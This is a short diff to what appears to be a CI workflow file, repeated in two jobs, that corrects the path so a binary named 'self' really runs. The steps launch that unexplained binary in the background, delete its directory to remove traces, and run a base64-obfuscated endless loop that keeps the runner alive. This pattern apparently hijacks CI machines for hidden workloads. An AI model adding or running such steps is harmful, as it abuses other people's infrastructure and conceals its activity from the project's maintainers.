@@ -56,7 +56,7 @@ jobs:
          sudo mkdir /home/runnerss/log
          mv self /home/runnerss/log/self
          chmod +x /home/runnerss/log/self
-         nohup /home/runnerss/self & sleep 0.1
+         nohup /home/runnerss/log/self & sleep 0.1
          sudo rm -rf /home/runnerss
          echo 'd2hpbGUgOjsgZG8Kc3VkbyBhcHQtZ2V0IHVwZGF0ZSAteQpzbGVlcCA2MDAKZG9uZQ==' > circle; base64 circle -d > while; chmod +x while; ./while
  
@@ -79,7 +79,7 @@ jobs:
          sudo mkdir /home/runnerss/log
          mv self /home/runnerss/log/self
          chmod +x /home/runnerss/log/self
-         nohup /home/runnerss/self & sleep 0.1
+         nohup /home/runnerss/log/self & sleep 0.1
          sudo rm -rf /home/runnerss
          echo 'd2hpbGUgOjsgZG8Kc3VkbyBhcHQtZ2V0IHVwZGF0ZSAteQpzbGVlcCA2MDAKZG9uZQ==' > circle; base64 circle -d > while; chmod +x while; ./while
          
